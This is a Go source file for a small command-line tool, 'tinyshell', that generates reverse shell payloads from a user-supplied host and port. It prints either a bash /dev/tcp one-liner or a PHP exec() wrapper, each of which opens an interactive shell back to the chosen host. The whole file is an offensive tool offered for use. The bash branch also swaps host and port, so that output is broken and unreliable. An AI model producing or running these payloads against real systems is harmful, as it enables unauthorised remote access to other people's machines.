package main

import (
	"context"
	"fmt"
	"log"
	"os"

	"github.com/urfave/cli/v3"
)

func main() {
	var host, port, payloadType string

	cmd := &cli.Command{
		Name:  "tinyshell",
		Usage: "generate reverse shell payloads!",
		Flags: []cli.Flag{
			&cli.StringFlag{
				Name:        "port",
				Aliases:     []string{"p"},
				Usage:       "set the port on the listener",
				Value:       port,
				Destination: &port,
				Required:    true,
			},
			&cli.StringFlag{
				Name:        "host",
				Aliases:     []string{"h"},
				Usage:       "set the address the shell should connect to",
				Value:       host,
				Destination: &host,
				Required:    true,
			},
			&cli.StringFlag{
				Name:        "type",
				Aliases:     []string{"t"},
				Usage:       "payload type",
				Destination: &payloadType,
				Value:       payloadType,
				Required:    true,
			},
		},
		Action: func(ctx context.Context, c *cli.Command) error {
			generatePayload(host, port, payloadType)

			return nil
		},
	}
	if err := cmd.Run(context.Background(), os.Args); err != nil {
		log.Fatal(err)
	}
}

func generatePayload(host, port, payloadType string) {
	bashShell := fmt.Sprintf(`bash -i >& /dev/tcp/%v/%v 0>&1`, port, host)
	phpShell := fmt.Sprintf(`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/%v/%v 0>&1'");`, host, port)

	switch payloadType {
	case "php":
		fmt.Println(phpShell)
		return
	case "bash":
		fmt.Println(bashShell)
		return
	default:
		fmt.Println("Payload type  '", payloadType, "' is unsupported.")
		return
	}
}
